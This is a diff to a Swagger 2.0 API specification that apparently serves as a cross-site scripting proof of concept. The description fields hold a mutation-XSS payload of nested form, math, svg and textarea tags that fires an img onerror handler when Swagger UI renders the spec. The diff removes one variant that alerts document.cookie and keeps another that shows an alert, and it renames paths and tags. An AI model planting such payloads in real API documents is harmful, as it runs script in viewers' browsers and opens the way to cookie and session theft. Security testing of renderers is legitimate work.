@@ -1,9 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS 
+  title: XSS
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(XSS Alert) src=1>"></form>
-     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -15,13 +14,13 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /burhanxd:
+  /M0X0101:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - burhanx01
+        - burhanxss
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
@@ -29,7 +28,6 @@ paths:
       parameters:
         - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(XSS Alert) src=1>"></form>
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
           format: int64
           in: path
           name: id
